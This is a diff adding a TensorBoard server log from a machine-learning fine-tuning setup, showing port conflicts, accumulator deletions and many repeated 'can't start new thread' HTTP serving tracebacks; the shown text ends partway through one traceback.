@@ -1,0 +1,1164 @@
+TensorFlow installation not found - running with reduced feature set.
+TensorBoard 2.16.2 at http://10.223.3.11:8833/ (Press CTRL+C to quit)
+TensorFlow installation not found - running with reduced feature set.
+TensorBoard 2.16.2 at http://10.223.3.11:8833/ (Press CTRL+C to quit)
+W0531 11:31:29.241646 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'May31_09-00-46_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0531 11:32:14.250306 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'May31_11-24-56_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0531 12:07:29.661614 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'May31_09-33-11_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0602 14:05:08.129743 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun02_14-04-51_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+TensorFlow installation not found - running with reduced feature set.
+Address already in use
+Port 8833 is in use by another program. Either identify and stop that program, or start the server with a different port.
+TensorFlow installation not found - running with reduced feature set.
+Address already in use
+Port 8833 is in use by another program. Either identify and stop that program, or start the server with a different port.
+W0602 14:10:33.255131 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun02_14-00-39_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0602 14:15:58.344519 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun02_14-10-55_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0602 14:17:13.363730 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun02_14-16-19_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0602 14:21:28.432456 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun02_14-21-06_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0602 14:21:48.437322 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun02_14-17-27_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+E0602 16:22:39.917886 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:39.919795 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:39.920355 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:39.920819 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:39.921271 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:39.921678 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:40.040543 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:40.041529 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:40.158709 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:40.161983 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:40.272593 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:40.281563 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:40.391459 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:40.403701 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:42.969870 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:42.970746 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:44.125676 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:44.126341 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:49.258933 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:22:49.262263 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:07.848239 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:07.849086 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:07.850548 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:07.851867 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:07.853633 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:07.854700 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:07.964576 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:07.967871 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:08.081463 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:08.082415 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:08.200941 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:08.207501 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:08.318213 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:08.325682 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:13.643229 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0602 16:24:13.647360 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+W0603 14:01:12.753943 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun03_13-54-56_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+E0603 14:58:48.267989 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.276352 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.276919 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.277330 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.277639 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.284338 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.369636 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.384668 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.396828 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.402030 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.407762 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.507158 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.525460 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.629860 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.659101 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.746591 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
